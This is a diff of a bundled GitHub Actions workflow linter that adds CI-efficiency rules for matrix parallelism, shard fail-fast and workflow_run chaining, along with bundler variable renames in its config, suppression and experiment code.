+          message: `Build/test workflow re-runs on ${event} metadata events (${noisy.join(", ")}) that do not change code.`,
+          suggestion: "Remove these types so the workflow runs on `opened`, `synchronize`, and `reopened`. If a label or edit really must trigger work, gate the jobs with `if:` on `github.event.action` or the label name so other metadata changes skip them.",
+          confidence: "medium"
+        });
+      }
+    }
+  }
+});
+
+// src/lint/rules/triggers/serialized-matrix.ts
+var serialized_matrix_default = defineRule({
+  meta: {
+    id: "triggers/serialized-matrix",
+    ruleset: "triggers",
+    description: "Avoid throttling a matrix with a `max-parallel` far below its number of legs.",
+    rationale: "A matrix exists to fan work out across runners. Setting `strategy.max-parallel` to 1, or to a small fraction of the matrix size, turns that fan-out back into a queue: wall-clock time grows with every leg while the total minutes billed stay the same. When agents open many pull requests, that latency stacks up across every change. Serializing is only worth it when legs genuinely contend for a shared resource, which is better expressed with `concurrency` or an environment.",
+    kind: "practice",
+    defaultSeverity: "warn",
+    presets: ["agentic", "strict"],
+    requires: [],
+    defaultOptions: { maxRatio: 4 },
+    validateOptions: (options) => Object.entries(options).filter(([, value2]) => typeof value2 !== "number" || value2 < 2).map(([key2]) => `${key2} must be a number of at least 2`),
+    references: [
+      "https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idstrategymax-parallel",
+      "https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/run-job-variations"
+    ],
+    impact: "medium",
+    example: {
+      bad: "strategy:\n  max-parallel: 1\n  matrix:\n    node: [18, 20, 22]",
+      good: "strategy:\n  matrix:\n    node: [18, 20, 22]"
+    }
+  },
+  check({ project, options, report }) {
+    for (const workflow of project.workflows) {
+      if (workflow.kind !== "workflow" || isDeployLike(workflow)) continue;
+      for (const job of workflow.jobs) {
+        if (job.uses || job.concurrency || job.environment) continue;
+        const size = matrixSize(job);
+        if (size === void 0 || size < 2) continue;
+        const limit3 = strategyField(workflow, job, "max-parallel");
+        const value2 = scalarValue(limit3?.value);
+        if (!limit3 || typeof value2 !== "number" || !Number.isInteger(value2) || value2 < 1 || value2 >= size) continue;
+        if (value2 > 1 && size / value2 < options.maxRatio) continue;
+        report({
+          path: workflow.path,
+          line: limit3.line,
+          key: `jobs.${job.id}.strategy.max-parallel`,
+          message: `Job "${job.id}" runs its ${size} matrix legs at most ${value2} at a time, so they queue instead of running in parallel.`,
+          suggestion: "Remove `max-parallel` (or raise it) so the matrix fans out. If the legs share a scarce resource, guard that with a `concurrency` group or environment instead and document why.",
+          confidence: "medium"
+        });
+      }
+    }
+  }
+});
+
+// src/lint/rules/triggers/shard-fail-fast.ts
+var SHARD_KEY = /^(?:shard|chunk|partition|split)(?:s|[-_]?(?:index|id|num(?:ber)?|count|total))?$/i;
+var shard_fail_fast_default = defineRule({
+  meta: {
+    id: "triggers/shard-fail-fast",
+    ruleset: "triggers",
+    description: "Let sharded pull request test matrices stop early when one shard fails.",
+    rationale: "When a test suite is split into shards, each leg runs a slice of the same suite against the same commit. With `fail-fast: false`, a failure in one shard still lets every other shard run to completion, even though the pull request is already red and will need another push. Keeping the default `fail-fast: true` on pull requests cancels the remaining shards and returns those minutes to the queue, which matters most when many agent-authored pull requests are iterating at once.",
+    kind: "practice",
+    defaultSeverity: "info",
+    presets: ["agentic", "strict"],
+    requires: [],
+    defaultOptions: {},
+    references: [
+      "https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idstrategyfail-fast"
+    ],
+    impact: "medium",
+    example: {
+      bad: "strategy:\n  fail-fast: false\n  matrix:\n    shard: [1, 2, 3, 4]",
+      good: "strategy:\n  fail-fast: ${{ github.event_name != 'pull_request' }}\n  matrix:\n    shard: [1, 2, 3, 4]"
+    }
+  },
+  check({ project, report }) {
+    for (const workflow of project.workflows) {
+      if (workflow.kind !== "workflow" || !isPullRequestWorkflow(workflow)) continue;
+      for (const job of workflow.jobs) {
+        if (job.uses || !job.matrix || "__expression" in job.matrix) continue;
+        const shardKey = Object.keys(job.matrix).find((key2) => SHARD_KEY.test(key2));
+        if (!shardKey) continue;
+        const failFast = strategyField(workflow, job, "fail-fast");
+        if (!failFast || scalarValue(failFast.value) !== false) continue;
+        report({
+          path: workflow.path,
+          line: failFast.line,
+          key: `jobs.${job.id}.strategy.fail-fast`,
+          message: `Job "${job.id}" shards its matrix by "${shardKey}" but sets fail-fast: false, so remaining shards keep running after one fails.`,
+          suggestion: "Drop `fail-fast: false`, or make it conditional (for example `fail-fast: ${{ github.event_name != 'pull_request' }}`) so pull request runs stop at the first failing shard while full runs still report every shard.",
+          confidence: "medium"
+        });
+      }
+    }
+  }
+});
+
+// src/lint/rules/triggers/workflow-run-chain.ts
+var UNTRUSTED_EVENTS = ["pull_request", "pull_request_target", "issue_comment", "pull_request_review", "pull_request_review_comment"];
+function upstreamNames(workflow) {
+  const on = field(workflow.source, workflow.source.doc.contents, "on");
+  const node = field(workflow.source, on?.value, "workflow_run")?.value;
+  const value2 = toJS(workflow.source, field(workflow.source, node, "workflows")?.value);
+  if (typeof value2 === "string") return [value2];
+  return Array.isArray(value2) ? value2.map(String) : [];
+}
+var workflow_run_chain_default = defineRule({
+  meta: {
+    id: "triggers/workflow-run-chain",
+    ruleset: "triggers",
+    description: "Avoid chaining workflows with `workflow_run` when the downstream work could be a dependent job.",
+    rationale: "A `workflow_run` trigger only fires after the upstream workflow finishes, so the downstream work waits for a second queue slot, a fresh runner, and another checkout before it starts. When pull request volume is high those extra hops add minutes to every change and make the run graph harder to follow. Calling the downstream work as a reusable workflow job with `needs:` keeps it in the same run, shares artifacts directly, and starts it the moment its dependencies succeed.",
+    kind: "practice",
+    defaultSeverity: "info",
+    presets: ["agentic", "strict"],
+    requires: [],
+    defaultOptions: {},
+    references: [
+      "https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#workflow_run",
+      "https://docs.github.com/en/actions/how-tos/reuse-automations/reuse-workflows"
+    ],
+    impact: "medium",
+    example: {
+      bad: "# deploy.yml\non:\n  workflow_run:\n    workflows: [CI]\n    types: [completed]",
+      good: "# ci.yml\njobs:\n  test: ...\n  deploy:\n    needs: test\n    uses: ./.github/workflows/deploy.yml"
+    }
+  },
+  check({ project, report }) {
+    for (const workflow of project.workflows) {
+      if (workflow.kind !== "workflow") continue;
+      const chained = trigger(workflow, "workflow_run");
+      if (!chained) continue;
+      if (chained.types && !chained.types.includes("completed")) continue;
+      const names = upstreamNames(workflow);
+      if (names.length === 0) continue;
+      const upstream = names.map(
+        (name) => project.workflows.find((candidate) => candidate.kind === "workflow" && (candidate.name ?? candidate.path) === name)
+      );
+      if (upstream.some((candidate) => candidate === void 0)) continue;
+      if (upstream.some((candidate) => candidate !== void 0 && hasTrigger(candidate, ...UNTRUSTED_EVENTS))) continue;
+      const label = names.map((name) => `"${name}"`).join(", ");
+      report({
+        path: workflow.path,
+        line: chained.line,
+        key: "on.workflow_run",
+        message: `Workflow waits for ${label} via workflow_run, adding a second queue wait, runner start, and checkout to every run.`,
+        suggestion: "Turn this workflow into a reusable workflow (`on: workflow_call`) and call it from the upstream workflow as a job with `needs:` on the jobs it depends on; pass build outputs as job outputs or artifacts within the same run.",
+        related: upstream.flatMap((candidate) => candidate ? [{ path: candidate.path, line: candidate.triggersLine }] : []),
+        confidence: "medium"
+      });
+    }
+  }
+});
+
+// src/lint/rules/triggers/index.ts
+var rules11 = [
+  workflow_run_chain_default,
+  serialized_matrix_default,
+  draft_pr_gating_default,
+  noisy_pr_types_default,
+  frequent_schedule_default,
+  shard_fail_fast_default,
+  missing_job_condition_matrix_default
+];
 
 // src/lint/rules/workflow/artifact-retention.ts
-var import_yaml9 = __toESM(require_dist(), 1);
-var UPLOAD_ACTIONS = /* @__PURE__ */ new Set(["actions/upload-artifact", "actions/upload-artifact/merge"]);
-var SINGLE_LINE = /* @__PURE__ */ new Set([import_yaml9.Scalar.PLAIN, import_yaml9.Scalar.QUOTE_DOUBLE, import_yaml9.Scalar.QUOTE_SINGLE]);
+var import_yaml24 = __toESM(require_dist(), 1);
+var UPLOAD_ACTIONS2 = /* @__PURE__ */ new Set(["actions/upload-artifact", "actions/upload-artifact/merge"]);
+var SINGLE_LINE2 = /* @__PURE__ */ new Set([import_yaml24.Scalar.PLAIN, import_yaml24.Scalar.QUOTE_DOUBLE, import_yaml24.Scalar.QUOTE_SINGLE]);
 function retentionDays(value2) {
   if (typeof value2 === "number") return value2;
   if (typeof value2 === "string" && /^\s*\d+\s*$/.test(value2)) return Number(value2);
@@ -18016,7 +20640,7 @@ function retentionDays(value2) {
 }
 function addRetention(file, workflow, step, days) {
   const withNode = directWith(workflow, step);
-  const pairs = (withNode?.items ?? []).filter((pair) => (0, import_yaml9.isScalar)(pair.key) && pair.key.value !== "<<");
+  const pairs = (withNode?.items ?? []).filter((pair) => (0, import_yaml24.isScalar)(pair.key) && pair.key.value !== "<<");
   const first = pairs[0];
   const last = pairs[pairs.length - 1];
   if (!first || !last) return void 0;
@@ -18024,7 +20648,7 @@ function addRetention(file, workflow, step, days) {
   const indent = indentOf(file.content, firstLine);
   const lastLine = lineOfNode(workflow.source, last.key);
   const value2 = last.value;
-  const endsOnKeyLine = (0, import_yaml9.isScalar)(value2) && SINGLE_LINE.has(value2.type) && value2.range !== void 0 && value2.range !== null && workflow.source.lineCounter.linePos(Math.max(value2.range[0], value2.range[1] - 1)).line === lastLine;
+  const endsOnKeyLine = (0, import_yaml24.isScalar)(value2) && SINGLE_LINE2.has(value2.type) && value2.range !== void 0 && value2.range !== null && workflow.source.lineCounter.linePos(Math.max(value2.range[0], value2.range[1] - 1)).line === lastLine;
   const line = `${indent}retention-days: ${days}`;
   return fix(
     `Set retention-days: ${days}`,
@@ -18058,7 +20682,7 @@ var artifact_retention_default = defineRule({
     const maxDays = options.maxDays;
     for (const { workflow, step } of steps([...project.workflows, ...project.actions])) {
       const action = step.uses?.action;
-      if (action?.kind !== "remote" || action.name === void 0 || !UPLOAD_ACTIONS.has(action.name)) continue;
+      if (action?.kind !== "remote" || action.name === void 0 || !UPLOAD_ACTIONS2.has(action.name)) continue;
       const retention = step.with.get("retention-days");
       if (!retention) {
         const file = project.files.get(workflow.path);
@@ -18128,8 +20752,8 @@ jobs: ...`
       const deploy = isDeployLike(workflow);
       const concurrency = workflow.concurrency;
       if (deploy) {
-        const cancels = [concurrency, ...workflow.jobs.map((job) => job.concurrency)].find((entry) => {
-          const value2 = entry?.value;
+        const cancels = [concurrency, ...workflow.jobs.map((job) => job.concurrency)].find((entry2) => {
+          const value2 = entry2?.value;
           return value2 && typeof value2 === "object" && value2["cancel-in-progress"] === true;
         });
         if (cancels) {
@@ -18232,8 +20856,8 @@ var job_timeout_default = defineRule({
 });
 
 // src/lint/rules/workflow/merge-group.ts
-var PR_AUTOMATION = /label(?:l)?er|labels|triage|stale|greet|welcome|assign|auto-?merge|release-drafter|semantic-pr|pr-title/i;
-var CODE_TYPES = /* @__PURE__ */ new Set(["opened", "synchronize", "reopened"]);
+var PR_AUTOMATION2 = /label(?:l)?er|labels|triage|stale|greet|welcome|assign|auto-?merge|release-drafter|semantic-pr|pr-title/i;
+var CODE_TYPES2 = /* @__PURE__ */ new Set(["opened", "synchronize", "reopened"]);
 var merge_group_default = defineRule({
   meta: {
     id: "workflow/merge-group",
@@ -18260,12 +20884,12 @@ var merge_group_default = defineRule({
       if (workflow.kind !== "workflow") continue;
       const pullRequest = trigger(workflow, "pull_request");
       if (!pullRequest || hasTrigger(workflow, "merge_group") || isDeployLike(workflow)) continue;
-      if (pullRequest.types && !pullRequest.types.some((type) => CODE_TYPES.has(type))) continue;
-      if (PR_AUTOMATION.test(`${workflow.path} ${workflow.name ?? ""}`)) continue;
-      const runsChecks = workflow.jobs.some(
+      if (pullRequest.types && !pullRequest.types.some((type) => CODE_TYPES2.has(type))) continue;
+      if (PR_AUTOMATION2.test(`${workflow.path} ${workflow.name ?? ""}`)) continue;
+      const runsChecks2 = workflow.jobs.some(
         (job) => job.uses !== void 0 || job.steps.some((step) => step.run !== void 0 || step.uses?.action.kind === "local" || step.uses?.action.name === "actions/checkout")
       );
-      if (!runsChecks) continue;
+      if (!runsChecks2) continue;
       report({
         path: workflow.path,
         line: pullRequest.line,
@@ -18378,22 +21002,26 @@ var outdated_action_major_default = defineRule({
 });
 
 // src/lint/rules/workflow/index.ts
-var rules8 = [artifact_retention_default, concurrency_default, job_timeout_default, merge_group_default, outdated_action_major_default];
+var rules12 = [artifact_retention_default, concurrency_default, job_timeout_default, merge_group_default, outdated_action_major_default];
 
 // src/lint/rules/index.ts
 var allRules = [
-  ...rules8,
+  ...rules12,
   ...rules3,
   ...rules,
   ...rules2,
   ...rules5,
   ...rules4,
   ...rules6,
-  ...rules7
+  ...rules8,
+  ...rules9,
+  ...rules11,
+  ...rules7,
+  ...rules10
 ];
 
 // src/lint/config.ts
-var import_yaml13 = __toESM(require_dist(), 1);
+var import_yaml28 = __toESM(require_dist(), 1);
 
 // src/knowledge/duration-policy.ts
 function durationPolicyProblems(config) {
@@ -18567,7 +21195,7 @@ var Validator = class {
   strings(path, value2, fallback) {
     if (value2 === void 0) return fallback;
     if (typeof value2 === "string") return [value2];
-    if (Array.isArray(value2) && value2.every((entry) => typeof entry === "string")) return value2;
+    if (Array.isArray(value2) && value2.every((entry2) => typeof entry2 === "string")) return value2;
     this.problem(path, "Expected a list of strings.");
     return fallback;
   }
@@ -18576,7 +21204,7 @@ var Validator = class {
     if (typeof value2 === "string" && allowed.includes(value2)) return value2;
     this.problem(
       path,
-      `Expected one of ${allowed.map((entry) => `"${entry}"`).join(", ")}.${typeof value2 === "string" ? didYouMean(value2, [...allowed]) : ""}`
+      `Expected one of ${allowed.map((entry2) => `"${entry2}"`).join(", ")}.${typeof value2 === "string" ? didYouMean(value2, [...allowed]) : ""}`
     );
     return fallback;
   }
@@ -18600,11 +21228,11 @@ function migrateLegacyConfig(raw) {
   if (!legacyKeys.some((key2) => key2 in raw)) return void 0;
   const migrated = { ...raw };
   if (Array.isArray(raw.disabledRules)) {
-    const rules9 = isRecord(raw.rules) ? { ...raw.rules } : {};
+    const rules13 = isRecord(raw.rules) ? { ...raw.rules } : {};
     for (const id of raw.disabledRules) {
-      if (typeof id === "string") rules9[DEPRECATED_RULE_IDS[id] ?? id] = "off";
+      if (typeof id === "string") rules13[DEPRECATED_RULE_IDS[id] ?? id] = "off";
     }
-    migrated.rules = rules9;
+    migrated.rules = rules13;
   }
   if ("failOnSeverity" in raw) {
     const map = { high: "error", medium: "warn", low: "info", never: "never" };
@@ -18621,7 +21249,7 @@ function migrateLegacyConfig(raw) {
   for (const key2 of legacyKeys) delete migrated[key2];
   return migrated;
 }
-function validateConfig(input2, rules9) {
+function validateConfig(input2, rules13) {
   const v = new Validator();
   if (input2 === void 0 || input2 === null) return { config: structuredClone(DEFAULT_CONFIG), problems: [], migrated: false };
   if (!isRecord(input2)) {
@@ -18649,17 +21277,17 @@ function validateConfig(input2, rules9) {
   if (raw.schemaVersion !== void 0 && raw.schemaVersion !== 1) {
     v.problem("schemaVersion", `Unsupported schemaVersion ${String(raw.schemaVersion)}; expected 1.`);
   }
-  const ruleIds = rules9.map((rule) => rule.meta.id);
-  const rulesetNames = [...new Set(rules9.map((rule) => rule.meta.ruleset))];
+  const ruleIds = rules13.map((rule) => rule.meta.id);
+  const rulesetNames = [...new Set(rules13.map((rule) => rule.meta.ruleset))];
   const config = structuredClone(DEFAULT_CONFIG);
   if (raw.localRules !== void 0) {
-    if (Array.isArray(raw.localRules) && raw.localRules.every((entry) => typeof entry === "string")) {
+    if (Array.isArray(raw.localRules) && raw.localRules.every((entry2) => typeof entry2 === "string")) {
       config.localRules = [...raw.localRules];
     } else {
       v.problem("localRules", "Expected a list of repository-relative .js or .mjs paths.");
     }
   }
-  const skipLocal = config.localRules.length > 0 && !rules9.some((rule) => rule.meta.ruleset === "local");
+  const skipLocal = config.localRules.length > 0 && !rules13.some((rule) => rule.meta.ruleset === "local");
   const isSkippedLocal = (id) => skipLocal && id.startsWith("local/");
   config.enabled = v.boolean("enabled", raw.enabled, true);
   config.extends = v.strings("extends", raw.extends, DEFAULT_CONFIG.extends).filter((preset, index) => {
@@ -18679,7 +21307,7 @@ function validateConfig(input2, rules9) {
     const id = DEPRECATED_RULE_IDS[rawId] ?? rawId;
     if (isSkippedLocal(id)) continue;
     if (id !== rawId) v.problem(`rules.${rawId}`, `Rule "${rawId}" is deprecated; use "${id}".`);
-    const rule = rules9.find((candidate) => candidate.meta.id === id);
+    const rule = rules13.find((candidate) => candidate.meta.id === id);
     if (!rule) {
       v.problem(`rules.${rawId}`, `Unknown rule "${rawId}".${didYouMean(rawId, ruleIds)}`);
       continue;
@@ -18743,8 +21371,8 @@ function validateConfig(input2, rules9) {
       ...group.rules !== void 0 ? { rules: v.strings(`fixes.groups.${name}.rules`, group.rules, []) } : {}
     };
   }
-  const ignore = Array.isArray(fixes.ignore) ? fixes.ignore.flatMap((entry, index) => {
-    const item = v.record(`fixes.ignore[${index}]`, entry);
+  const ignore = Array.isArray(fixes.ignore) ? fixes.ignore.flatMap((entry2, index) => {
+    const item = v.record(`fixes.ignore[${index}]`, entry2);
     if (typeof item.rule !== "string") {
       v.problem(`fixes.ignore[${index}].rule`, "Expected a rule id.");
       return [];
@@ -18795,9 +21423,9 @@ function validateConfig(input2, rules9) {
   if (durations.objectives !== void 0 && !Array.isArray(durations.objectives)) v.problem("durations.objectives", "Expected a list of duration objectives.");
   config.durations = {
     minSamples: v.number("durations.minSamples", durations.minSamples, DEFAULT_CONFIG.durations.minSamples, 2),
-    objectives: (Array.isArray(durations.objectives) ? durations.objectives : []).map((entry, index) => {
+    objectives: (Array.isArray(durations.objectives) ? durations.objectives : []).map((entry2, index) => {
       const path = `durations.objectives[${index}]`;
-      const objective = v.record(path, entry);
+      const objective = v.record(path, entry2);
       v.unknownKeys(path, objective, ["workflow", "job", "maxDurationMs"]);
       return {
         workflow: v.string(`${path}.workflow`, objective.workflow, ""),
@@ -18809,10 +21437,10 @@ function validateConfig(input2, rules9) {
   v.problems.push(...durationPolicyProblems(config.durations));
   return { config, problems: v.problems, migrated: legacy !== void 0 };
 }
-function parseConfigText(text4, rules9, path = CONFIG_PATHS[0] ?? "config") {
+function parseConfigText(text4, rules13, path = CONFIG_PATHS[0] ?? "config") {
   let raw;
   try {
-    raw = (0, import_yaml13.parse)(text4, { maxAliasCount: 100 });
+    raw = (0, import_yaml28.parse)(text4, { maxAliasCount: 100 });
   } catch (error2) {
     return {
       config: structuredClone(DEFAULT_CONFIG),
@@ -18820,20 +21448,20 @@ function parseConfigText(text4, rules9, path = CONFIG_PATHS[0] ?? "config") {
       migrated: false
     };
   }
-  return validateConfig(raw, rules9);
+  return validateConfig(raw, rules13);
 }
-function resolveRules(config, rules9, presetOverride) {
+function resolveRules(config, rules13, presetOverride) {
   const presets = presetOverride ?? config.extends;
-  const severity = new Map(rules9.map((rule) => [rule.meta.id, "off"]));
+  const severity = new Map(rules13.map((rule) => [rule.meta.id, "off"]));
   for (const preset of presets) {
-    for (const rule of rules9) {
+    for (const rule of rules13) {
       if (preset === "all" || rule.meta.presets.includes(preset)) {
         severity.set(rule.meta.id, rule.meta.defaultSeverity);
       }
     }
   }
   for (const [ruleset, value2] of Object.entries(config.rulesets)) {
-    for (const rule of rules9) {
+    for (const rule of rules13) {
       if (rule.meta.ruleset === ruleset) severity.set(rule.meta.id, value2);
     }
   }
@@ -18846,7 +21474,7 @@ function resolveRules(config, rules9, presetOverride) {
       severity.set(id, setting);
     }
   }
-  return rules9.flatMap((rule) => {
+  return rules13.flatMap((rule) => {
     const level = severity.get(rule.meta.id) ?? "off";
     if (level === "off") return [];
     return [
@@ -18922,7 +21550,7 @@ function stringRecord(value2) {
   if (!value2 || typeof value2 !== "object" || Array.isArray(value2)) return {};
   return Object.fromEntries(
     Object.entries(value2).filter(
-      (entry) => typeof entry[1] === "string"
+      (entry2) => typeof entry2[1] === "string"
     )
   );
 }
@@ -19145,9 +21773,9 @@ function collectSuppressions(file) {
   });
   return result;
 }
-function suppress(entry, diagnostic) {
+function suppress(entry2, diagnostic) {
   let hit = false;
-  for (const directive of entry.directives) {
+  for (const directive of entry2.directives) {
     if (directive.kind === "next-line" && directive.target !== diagnostic.line) continue;
     if (directive.ids === "all") {
       directive.usedAll = true;
@@ -19163,9 +21791,9 @@ function suppress(entry, diagnostic) {
   }
   return hit;
 }
-function unusedDirectives(suppressionsFor, paths, skipped, rules9) {
+function unusedDirectives(suppressionsFor, paths, skipped, rules13) {
   const skippedIds = new Set(skipped.map((skip2) => skip2.ruleId));
-  const skippedRulesets = new Set(rules9.filter((rule) => skippedIds.has(rule.meta.id)).map((rule) => rule.meta.ruleset));
+  const skippedRulesets = new Set(rules13.filter((rule) => skippedIds.has(rule.meta.id)).map((rule) => rule.meta.ruleset));
   const result = [];
   for (const path of paths) {
     for (const directive of suppressionsFor(path)?.directives ?? []) {
@@ -19253,12 +21881,12 @@ function lint(rawInput, options) {
   const suppressionsFor = (path) => {
     const file = project.files.get(path);
     if (!file) return void 0;
-    let entry = suppressionCache.get(path);
-    if (!entry) {
-      entry = collectSuppressions(file);
-      suppressionCache.set(path, entry);
+    let entry2 = suppressionCache.get(path);
+    if (!entry2) {
+      entry2 = collectSuppressions(file);
+      suppressionCache.set(path, entry2);
     }
-    return entry;
+    return entry2;
   };
   const seen = /* @__PURE__ */ new Set();
   const occurrences = /* @__PURE__ */ new Map();
@@ -19323,8 +21951,8 @@ function atLeast(severity, minimum) {
 }
 
 // src/lint/docs.ts
-function renderRulesMarkdown(rules9) {
-  const rulesets = [...new Set(rules9.map((rule) => rule.meta.ruleset))];
+function renderRulesMarkdown(rules13) {
+  const rulesets = [...new Set(rules13.map((rule) => rule.meta.ruleset))];
   const lines = [
     "# Rules",
     "",
@@ -19337,14 +21965,14 @@ function renderRulesMarkdown(rules9) {
     "",
     "| Rule | Kind | Default | Presets | Fixable | Description |",
     "| --- | --- | --- | --- | --- | --- |",
-    ...rules9.map(
+    ...rules13.map(
       (rule) => `| [\`${rule.meta.id}\`](#${ruleAnchor(rule.meta.id)}) | ${rule.meta.kind} | ${rule.meta.defaultSeverity} | ${rule.meta.presets.join(", ")} | ${rule.meta.fixable ? "yes" : ""} | ${rule.meta.description.replace(/\|/g, "\\|")} |`
     ),
     ""
   ];
   for (const ruleset of rulesets) {
     lines.push(`## Ruleset: ${ruleset}`, "");
-    for (const rule of rules9.filter((candidate) => candidate.meta.ruleset === ruleset)) {
+    for (const rule of rules13.filter((candidate) => candidate.meta.ruleset === ruleset)) {
       const meta = rule.meta;
       lines.push(`<a id="${ruleAnchor(meta.id)}"></a>`, "", `### ${meta.id}`, "", meta.description, "", `**Why:** ${meta.rationale}`, "");
       lines.push(
@@ -19373,7 +22001,7 @@ function renderRulesMarkdown(rules9) {
 var VERSION = "0.2.0";
 
 // src/cli/experiments.ts
-var import_yaml20 = __toESM(require_dist(), 1);
+var import_yaml35 = __toESM(require_dist(), 1);
 import { appendFile, readdir as readdir3, readFile as readFile4, stat as stat5 } from "node:fs/promises";
 import { join as join7 } from "node:path";
 import { parseArgs as parseArgs2 } from "node:util";
@@ -19499,7 +22127,7 @@ async function readFileAt(client, repo, path, ref) {
 }
 
 // src/experiments/manifest.ts
-var import_yaml16 = __toESM(require_dist(), 1);
+var import_yaml31 = __toESM(require_dist(), 1);
 var EXPERIMENT_PREFIX = "experiments/";
 var TRUNK = "trunk";
 var NAME = /^[a-z0-9][a-z0-9-]{1,47}$/;
@@ -19536,9 +22164,9 @@ function validateManifest(input2, options = {}) {
   const arms = [];
   if (!Array.isArray(root.arms) || root.arms.length === 0) v.problem("arms", "Define at least one arm.");
   else {
-    root.arms.forEach((entry, index) => {
+    root.arms.forEach((entry2, index) => {
       const path = `arms[${index}]`;
-      const arm = v.record(path, entry);
+      const arm = v.record(path, entry2);
       v.unknownKeys(path, arm, ["name", "title", "approach"]);
       const armName = v.string(`${path}.name`, arm.name, "");
       if (!NAME.test(armName) || armName === TRUNK) v.problem(`${path}.name`, `Use 2-48 lowercase letters, digits, or dashes (not "${TRUNK}").`);
@@ -19586,8 +22214,8 @@ function validateManifest(input2, options = {}) {
     const metrics2 = Array.isArray(raw.metrics) ? raw.metrics : [];
     manifest.evidence = {
       improvement: v.number("evidence.improvement", raw.improvement, 0, -1),
-      metrics: metrics2.flatMap((entry, index) => {
-        const item = v.record(`evidence.metrics[${index}]`, entry);
+      metrics: metrics2.flatMap((entry2, index) => {
+        const item = v.record(`evidence.metrics[${index}]`, entry2);
         const optional = (key2) => typeof item[key2] === "number" ? { [key2]: item[key2] } : {};
         return [{ metric: v.string(`evidence.metrics[${index}].metric`, item.metric, ""), delta: v.number(`evidence.metrics[${index}].delta`, item.delta, 0, -1), ...optional("control"), ...optional("arm"), ...optional("pValue") }];
       })
@@ -19597,13 +22225,13 @@ function validateManifest(input2, options = {}) {
 }
 function parseManifest2(text4, options = {}) {
   try {
-    return validateManifest((0, import_yaml16.parse)(text4), options);
+    return validateManifest((0, import_yaml31.parse)(text4), options);
   } catch (error2) {
     return { problems: [{ path: "experiment.yml", message: error2.message }] };
   }
 }
 function serializeManifest(manifest) {
-  return (0, import_yaml16.stringify)(manifest, { lineWidth: 0 });
+  return (0, import_yaml31.stringify)(manifest, { lineWidth: 0 });
 }
 function scoreRubric(scores, rubric) {
   const total = rubric.criteria.reduce((sum, criterion) => sum + criterion.weight, 0) || 1;
@@ -19697,7 +22325,7 @@ function scoreArm(manifest, control, arm, config) {
 }
 
 // src/experiments/collect.ts
-var seconds = (start2, end) => {
+var seconds2 = (start2, end) => {
   const value2 = (Date.parse(end ?? "") - Date.parse(start2 ?? "")) / 1e3;
   return Number.isFinite(value2) && value2 >= 0 ? value2 : void 0;
 };
@@ -19715,14 +22343,14 @@ async function ciSamples(client, repo, spec2, options) {
   const samples = [];
   for (const run4 of runs) {
     if (!spec2.job) {
-      const value3 = seconds(run4.run_started_at ?? run4.created_at, run4.updated_at);
+      const value3 = seconds2(run4.run_started_at ?? run4.created_at, run4.updated_at);
       if (value3 !== void 0) samples.push(value3);
       continue;
     }
     const response2 = await client.request("GET /repos/{owner}/{repo}/actions/runs/{run_id}/jobs", { ...repo, run_id: run4.id, per_page: 100 }).catch(() => void 0);
     const list3 = response2?.data?.jobs ?? [];
     const job = list3.find((candidate) => candidate.name === spec2.job && candidate.conclusion === "success");
-    const value2 = job ? seconds(job.started_at, job.completed_at) : void 0;
+    const value2 = job ? seconds2(job.started_at, job.completed_at) : void 0;
     if (value2 !== void 0) samples.push(value2);
   }
   return samples;
@@ -19790,7 +22418,7 @@ function mergeMeasurement(measurements, update2) {
 }
 
 // src/experiments/config.ts
-var import_yaml17 = __toESM(require_dist(), 1);
+var import_yaml32 = __toESM(require_dist(), 1);
 var HILL_CLIMB_CONFIG_PATH = ".github/hill-climb.yml";
 var CORPUS_METRICS = ["precision", "recall", "f1", "fixRate", "durationMs"];
 var DEFAULT_RUBRIC = {
@@ -19827,9 +22455,9 @@ function validateHillClimbConfig(input2) {
   if (rubricRaw.criteria !== void 0) {
     if (!Array.isArray(rubricRaw.criteria) || rubricRaw.criteria.length === 0) v.problem("rubric.criteria", "Expected a non-empty list.");
     else {
-      criteria = rubricRaw.criteria.map((entry, index) => {
+      criteria = rubricRaw.criteria.map((entry2, index) => {
         const path = `rubric.criteria[${index}]`;
-        const item = v.record(path, entry);
+        const item = v.record(path, entry2);
         v.unknownKeys(path, item, ["id", "weight", "description"]);
         return { id: v.string(`${path}.id`, item.id, `criterion-${index}`), weight: v.number(`${path}.weight`, item.weight, 1), description: v.string(`${path}.description`, item.description, "") };
       });
@@ -19841,9 +22469,9 @@ function validateHillClimbConfig(input2) {
   if (root.metrics !== void 0) {
     if (!Array.isArray(root.metrics) || root.metrics.length === 0) v.problem("metrics", "Expected a non-empty list.");
     else {
-      metrics = root.metrics.map((entry, index) => {
+      metrics = root.metrics.map((entry2, index) => {
         const path = `metrics[${index}]`;
-        const item = v.record(path, entry);
+        const item = v.record(path, entry2);
         v.unknownKeys(path, item, ["id", "source", "direction", "weight", "workflow", "job", "maxRegression"]);
         const metric = {
           id: v.string(`${path}.id`, item.id, `metric-${index}`),
@@ -19902,7 +22530,7 @@ function validateHillClimbConfig(input2) {
 function parseHillClimbConfig(text4) {
   if (text4 === void 0) return { config: structuredClone(DEFAULT_HILL_CLIMB_CONFIG), problems: [] };
   try {
-    const raw = (0, import_yaml17.parse)(text4);
+    const raw = (0, import_yaml32.parse)(text4);
     return validateHillClimbConfig(raw ?? {});
   } catch (error2) {
     return { config: structuredClone(DEFAULT_HILL_CLIMB_CONFIG), problems: [{ path: HILL_CLIMB_CONFIG_PATH, message: error2.message }] };
@@ -19910,7 +22538,7 @@ function parseHillClimbConfig(text4) {
 }
 
 // src/experiments/corpus.ts
-var import_yaml18 = __toESM(require_dist(), 1);
+var import_yaml33 = __toESM(require_dist(), 1);
 import { readdir, readFile, stat } from "node:fs/promises";
 import { join as join2, relative as relative2, sep } from "node:path";
 var ratio = (numerator, denominator) => denominator === 0 ? 1 : numerator / denominator;
@@ -19922,7 +22550,7 @@ function match(diagnostics, expected) {
   const unmatched = [];
   for (const diagnostic of diagnostics) {
     const index = remaining.findIndex(
-      (finding2) => finding2.rule === diagnostic.ruleId && finding2.path === diagnostic.path && (finding2.line === void 0 || finding2.line === diagnostic.line)
+      (finding3) => finding3.rule === diagnostic.ruleId && finding3.path === diagnostic.path && (finding3.line === void 0 || finding3.line === diagnostic.line)
     );
     if (index === -1) unmatched.push(diagnostic);
     else {
@@ -20010,27 +22638,27 @@ function evaluateCorpus(engine, cases, options = {}) {
 async function walk(root, directory = root) {
